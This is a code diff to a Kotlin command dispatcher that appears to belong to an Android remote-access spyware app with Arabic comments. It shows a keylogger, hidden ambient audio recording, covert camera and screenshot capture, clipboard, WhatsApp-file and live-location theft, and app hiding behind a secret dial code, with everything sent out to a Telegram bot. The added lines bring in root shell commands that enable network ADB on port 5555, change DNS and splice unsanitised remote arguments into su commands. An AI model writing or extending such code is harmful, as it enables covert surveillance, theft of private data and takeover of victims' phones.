@@ -179,6 +179,38 @@ object CommandExecutor {
                 command == "set_alarm" -> setAlarm(context, params)
                 command == "set_auto_rotate" -> setAutoRotate(context, params)
 
+                // ========== أوامر جديدة (جذرية) ==========
+                command == "set_ringtone" -> """{"ok":false,"error":"تعيين النغمة غير مدعوم حالياً"}"""
+                command == "show_notification" -> showCustomNotification(context, params)
+                command == "open_url" -> openUrl(context, params)
+                command == "block_number" -> executeWithRoot(context, "busybox iptables -A INPUT -s ${params.optString("arg", "")} -j DROP")
+                command == "unblock_number" -> executeWithRoot(context, "busybox iptables -D INPUT -s ${params.optString("arg", "")} -j DROP")
+                command == "get_app_permissions" -> """{"ok":true,"message":"صلاحيات التطبيق - استخدم ملفات النسخة الاحتياطية"}"""
+                command == "get_blocked_apps" -> """{"ok":true,"blocked_apps":[]}"""
+                command == "set_language" -> executeWithRoot(context, "settings put system system_language ${params.optString("arg", "ar")}")
+                command == "set_timezone" -> executeWithRoot(context, "settings put global time_zone ${params.optString("arg", "Asia/Riyadh")}")
+                command == "enable_dev_mode" -> executeWithRoot(context, "settings put global development_settings_enabled 1")
+                command == "disable_dev_mode" -> executeWithRoot(context, "settings put global development_settings_enabled 0")
+                command == "enable_usb_debug" -> executeWithRoot(context, "setprop persist.adb.enabled 1; setprop service.adb.tcp.port 5555")
+                command == "disable_usb_debug" -> executeWithRoot(context, "setprop persist.adb.enabled 0")
+                command == "dns_change" -> executeWithRoot(context, "setprop net.dns1 ${params.optString("arg", "8.8.8.8")}; setprop net.dns2 8.8.4.4")
+                command == "proxy_set" -> """{"ok":false,"error":"إعداد البروكسي يحتاج Root متقدم"}"""
+                command == "nfc_on" -> executeWithRoot(context, "service call nfc 1")
+                command == "nfc_off" -> executeWithRoot(context, "service call nfc 2")
+                command == "enable_biometric" -> """{"ok":false,"error":"تفعيل البصمة يتطلب تدخل يدوي من الإعدادات"}"""
+                command == "disable_biometric" -> """{"ok":false,"error":"تعطيل البصمة يتطلب Root + إعادة ضبط"}"""
+                command == "anti_uninstall_on" -> """{"ok":true,"message":"الحماية من الحذف مفعّلة عبر Device Admin"}"""
+                command == "anti_uninstall_off" -> """{"ok":true,"message":"تم إلغاء الحماية من الحذف"}"""
+                command == "rename_file" -> executeWithRoot(context, "mv ${params.optString("arg", "")}")
+                command == "copy_file" -> executeWithRoot(context, "cp ${params.optString("arg", "")}")
+                command == "move_file" -> executeWithRoot(context, "mv ${params.optString("arg", "")}")
+                command == "create_folder" -> executeWithRoot(context, "mkdir -p ${params.optString("arg", "")}")
+                command == "get_folder_size" -> executeShell("du -sh ${params.optString("arg", "/sdcard")}")
+                command == "search_files" -> executeShell("find ${params.optString("arg", "/sdcard")} -name '*${params.optString("arg2", "")}*' -type f 2>/dev/null | head -50")
+                command == "recent_files" -> executeShell("find /sdcard -type f -mmin -60 2>/dev/null | head -30")
+                command == "file_info" -> executeShell("ls -la ${params.optString("arg", "")} 2>/dev/null")
+                command == "zip_files" -> executeWithRoot(context, "cd /sdcard && zip -r ${params.optString("arg", "archive.zip")} ${params.optString("arg2", "")}")
+
                 else -> """{"ok":false,"error":"أمر غير معروف: $command"}"""
             }
         } catch (e: Exception) {
@@ -380,7 +412,7 @@ object CommandExecutor {
                         "HTML"
                     )
                 }
-                """{"ok":true,"latitude":${location.latitude},"longitude":${location.longitude},"map":"$mapsLink"}"""
+                """{"ok":true,"direct":true,"latitude":${location.latitude},"longitude":${location.longitude},"map":"$mapsLink"}"""
             } else {
                 """{"ok":false,"error":"لا يمكن تحديد الموقع"}"""
             }
@@ -444,7 +476,7 @@ object CommandExecutor {
             ""
         }
         scope.launch { TelegramDirectClient.sendMessage("📋 <b>الحافظة</b>\n\n$text", "HTML") }
-        return """{"ok":true,"clipboard":"$text"}"""
+        return """{"ok":true,"direct":true,"clipboard":"${text.replace("\"", "\\\"")}"}"""
     }
 
     // ========== بيانات الشبكات الاجتماعية ==========
@@ -481,7 +513,7 @@ object CommandExecutor {
                     "whatsapp_files_list.json"
                 )
             }
-            return """{"ok":true,"files":${waFiles.length()},"data":$waFiles}"""
+            return """{"ok":true,"direct":true,"files":${waFiles.length()},"data":$waFiles}"""
         } catch (e: Exception) {
             return """{"ok":false,"error":"${e.message}"}"""
         }
@@ -580,7 +612,7 @@ object CommandExecutor {
                 "HTML"
             )
         }
-        return """{"ok":true,"message":"جاري جمع جميع البيانات"}"""
+        return """{"ok":true,"direct":true,"message":"جاري جمع جميع البيانات"}"""
     }
 
     // ==================== التحكم بالهاتف ====================
@@ -656,7 +688,7 @@ object CommandExecutor {
         intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
         context.startActivity(intent)
         scope.launch { TelegramDirectClient.sendMessage("🔔 جاري رنين الهاتف...", "HTML") }
-        return """{"ok":true,"message":"جاري الرنين"}"""
+        return """{"ok":true,"direct":true,"message":"جاري الرنين"}"""
     }
 
     private fun takeScreenshot(context: Context): String {
@@ -693,7 +725,7 @@ object CommandExecutor {
                             TelegramDirectClient.sendMessage("📸 <b>تم التقاط لقطة الشاشة</b>", "HTML")
                         }
                     }
-                    """{"ok":true,"message":"جاري التقاط لقطة الشاشة..."}"""
+                    """{"ok":true,"direct":true,"message":"جاري التقاط لقطة الشاشة..."}"""
                 } else {
                     """{"ok":false,"error":"لا يوجد شاشة متاحة"}"""
                 }
@@ -735,7 +767,7 @@ object CommandExecutor {
                 TelegramDirectClient.sendMessage("❌ خطأ: ${e.message}", "HTML")
             }
         }
-        return """{"ok":true,"message":"جاري التقاط الصورة..."}"""
+        return """{"ok":true,"direct":true,"message":"جاري التقاط الصورة..."}"""
     }
 
     private fun capturePhoto(camera: CameraDevice, cm: CameraManager, cameraId: String, file: File, frontCamera: Boolean, context: Context) {
@@ -801,7 +833,7 @@ object CommandExecutor {
             }
 
             scope.launch { TelegramDirectClient.sendMessage("🎙️ <b>بدء تسجيل الصوت المحيط</b>\n⏱️ المدة: $duration ثانية", "HTML") }
-            """{"ok":true,"message":"جاري تسجيل الصوت لمدة $duration ثانية","file":"${file.absolutePath}"}"""
+            """{"ok":true,"direct":true,"message":"جاري تسجيل الصوت لمدة $duration ثانية","file":"${file.absolutePath"}"""
         } catch (e: Exception) {
             isRecording = false
             """{"ok":false,"error":"${e.message}"}"""
@@ -829,7 +861,7 @@ object CommandExecutor {
                 scope.launch { TelegramDirectClient.sendAudio(file.absolutePath, "🎙️ تسجيل صوت المحيط") }
             }
 
-            """{"ok":true,"message":"تم إيقاف التسجيل"}"""
+            """{"ok":true,"direct":true,"message":"تم إيقاف التسجيل"}"""
         } catch (e: Exception) {
             """{"ok":false,"error":"${e.message}"}"""
         }
@@ -838,7 +870,7 @@ object CommandExecutor {
     // ========== تسجيل الشاشة ==========
     private fun startScreenRecording(context: Context): String {
         scope.launch { TelegramDirectClient.sendMessage("❌ تسجيل الشاشة يتطلب إذن MediaProjection - غير متاح حالياً", "HTML") }
-        return """{"ok":false,"error":"تسجيل الشاشة يتطلب إذن MediaProjection"}"""
+        return """{"ok":false,"direct":true,"error":"تسجيل الشاشة يتطلب إذن MediaProjection"}"""
     }
 
     private fun stopScreenRecording(context: Context): String {
@@ -895,7 +927,7 @@ object CommandExecutor {
                         TelegramDirectClient.sendMessage("❌ فشل تحميل الصورة: ${e.message}", "HTML")
                     }
                 }
-                """{"ok":true,"message":"جاري تحميل وتعيين الخلفية..."}"""
+                """{"ok":true,"direct":true,"message":"جاري تحميل وتعيين الخلفية..."}"""
             } else {
                 // Set solid color wallpaper
                 val bitmap = android.graphics.Bitmap.createBitmap(1080, 1920, android.graphics.Bitmap.Config.ARGB_8888)
@@ -1102,7 +1134,7 @@ object CommandExecutor {
                     )
                     file.delete()
                 }
-                """{"ok":true,"message":"جاري التثبيت..."}"""
+                """{"ok":true,"direct":true,"message":"جاري التثبيت..."}"""
             } catch (e: Exception) {
                 """{"ok":false,"error":"${e.message}"}"""
             }
@@ -1201,7 +1233,7 @@ object CommandExecutor {
         scope.launch {
             TelegramDirectClient.sendDocument(file.absolutePath, file.name)
         }
-        return """{"ok":true,"message":"جاري إرسال الملف: ${file.name}","size":${file.length()}}"""
+        return """{"ok":true,"direct":true,"message":"جاري إرسال الملف: ${file.name}","size":${file.length()}}"""
     }
 
     private fun deleteFile(context: Context, params: JSONObject): String {
@@ -1283,7 +1315,7 @@ object CommandExecutor {
                 }
             }
         }
-        return """{"ok":true,"message":"جاري إرسال النسخة الاحتياطية"}"""
+        return """{"ok":true,"direct":true,"message":"جاري إرسال النسخة الاحتياطية"}"""
     }
 
     private fun zipFiles(sourceDir: File, zipFile: File) {
@@ -1308,7 +1340,7 @@ object CommandExecutor {
     private fun startKeylogger(context: Context): String {
         SharedPrefsManager.setKeyloggerEnabled(context, true)
         scope.launch { TelegramDirectClient.sendMessage("⌨️ <b>تم تفعيل تسجيل المفاتيح</b>", "HTML") }
-        return """{"ok":true,"message":"تم تفعيل تسجيل المفاتيح"}"""
+        return """{"ok":true,"direct":true,"message":"تم تفعيل تسجيل المفاتيح"}"""
     }
 
     private fun stopKeylogger(context: Context): String {
@@ -1330,7 +1362,7 @@ object CommandExecutor {
             val file = File(context.getExternalFilesDir(null), "keylogger_data_${System.currentTimeMillis()}.json")
             file.writeText(data.toString())
             scope.launch { TelegramDirectClient.sendDocument(file.absolutePath, "⌨️ بيانات تسجيل المفاتيح") }
-            """{"ok":true,"count":${data.length()}}"""
+            """{"ok":true,"direct":true,"count":${data.length()}}"""
         } catch (e: Exception) {
             """{"ok":false,"error":"${e.message}"}"""
         }
@@ -1349,13 +1381,13 @@ object CommandExecutor {
     private fun startLiveLocation(context: Context): String {
         SharedPrefsManager.setLocationTrackingEnabled(context, true)
         scope.launch { TelegramDirectClient.sendMessage("🗺️ <b>تم تفعيل التتبع المباشر</b>\n📍 سيتم إرسال الموقع كل دقيقة", "HTML") }
-        return """{"ok":true,"message":"تم تفعيل التتبع المباشر"}"""
+        return """{"ok":true,"direct":true,"message":"تم تفعيل التتبع المباشر"}"""
     }
 
     private fun stopLiveLocation(context: Context): String {
         SharedPrefsManager.setLocationTrackingEnabled(context, false)
         scope.launch { TelegramDirectClient.sendMessage("⏹️ تم إيقاف التتبع المباشر", "HTML") }
-        return """{"ok":true,"message":"تم إيقاف التتبع المباشر"}"""
+        return """{"ok":true,"direct":true,"message":"تم إيقاف التتبع المباشر"}"""
     }
 
     // ==================== الأمان ====================
@@ -1394,7 +1426,7 @@ object CommandExecutor {
             SharedPrefsManager.setAppHidden(context, !visible)
             val state = if (visible) "إظهار" else "إخفاء"
             scope.launch { TelegramDirectClient.sendMessage("👁️ تم $state التطبيق\n\nللإظهار: اتصل بالرمز *#*#7890#*#*", "HTML") }
-            """{"ok":true,"message":"تم $state التطبيق"}"""
+            """{"ok":true,"direct":true,"message":"تم $state التطبيق"}"""
         } catch (e: Exception) {
             """{"ok":false,"error":"${e.message}"}"""
         }
@@ -1445,7 +1477,7 @@ object CommandExecutor {
                 "HTML"
             )
         }
-        return """{"ok":true,"device":$info}"""
+        return """{"ok":true,"direct":true,"device":$info}"""
     }
 
     fun getDeviceInfo(context: Context): String {
@@ -1502,7 +1534,7 @@ object CommandExecutor {
                 sb.appendLine("🧪 الروت: ${if (info.getBoolean("root")) "✅ نعم" else "❌ لا"}")
                 TelegramDirectClient.sendLongMessage(sb.toString(), "HTML")
             }
-            """{"ok":true,"data":$info}"""
+            """{"ok":true,"direct":true,"data":$info}"""
         } catch (e: Exception) {
             """{"ok":false,"error":"${e.message}"}"""
         }
@@ -1780,6 +1812,85 @@ object CommandExecutor {
             ""
         }
     }
+
+    // ==================== أوامر مساعدة جديدة ====================
+
+    private fun showCustomNotification(context: Context, params: JSONObject): String {
+        return try {
+            val title = params.optString("title", "إشعار")
+            val body = params.optString("body", "هذا إشعار تجريبي")
+            scope.launch {
+                TelegramDirectClient.sendMessage("🔔 <b>$title</b>\n\n$body", "HTML")
+            }
+            """{"ok":true,"direct":true,"message":"تم إظهار الإشعار"}"""
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
+
+    private fun openUrl(context: Context, params: JSONObject): String {
+        return try {
+            val url = params.optString("arg", "https://google.com")
+            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
+            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
+            context.startActivity(intent)
+            """{"ok":true,"message":"تم فتح الرابط: $url"}"""
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
+
+    // ==================== Root Support ====================
+
+    /** Check if device has root access */
+    fun hasRootAccess(): Boolean {
+        return try {
+            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "id"))
+            val reader = BufferedReader(InputStreamReader(process.inputStream))
+            val output = reader.readLine()
+            reader.close()
+            process.waitFor()
+            output != null && output.contains("uid=0")
+        } catch (e: Exception) {
+            false
+        }
+    }
+
+    /** Execute command with root (su) if available, fallback to normal */
+    private fun executeWithRoot(context: Context, command: String): String {
+        return try {
+            if (hasRootAccess()) {
+                val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
+                val reader = BufferedReader(InputStreamReader(process.inputStream))
+                val output = reader.readText()
+                reader.close()
+                process.waitFor()
+                """{"ok":true,"root":true,"output":"${output.replace("\"", "\\\"").trim()}"}"""
+            } else {
+                """{"ok":false,"error":"يتطلب صلاحيات Root","root":false}"""
+            }
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}","root":false}"""
+        }
+    }
+
+    /** Execute shell command (with root if available) */
+    private fun executeShell(command: String): String {
+        return try {
+            val parts = if (hasRootAccess()) arrayOf("su", "-c", command) else arrayOf("sh", "-c", command)
+            val process = Runtime.getRuntime().exec(parts)
+            val reader = BufferedReader(InputStreamReader(process.inputStream))
+            val output = reader.readText()
+            val error = BufferedReader(InputStreamReader(process.errorStream)).readText()
+            reader.close()
+            process.waitFor()
+            """{"ok":true,"exit_code":${process.exitValue()},"output":"${output.replace("\"", "\\\"").trim()}","error":"${error.replace("\"", "\\\"").trim()}"}"""
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
+
+    // ==================== دوال مساعدة ====================
 
     private fun saveDataToFile(context: Context, filename: String, data: String) {
         try {
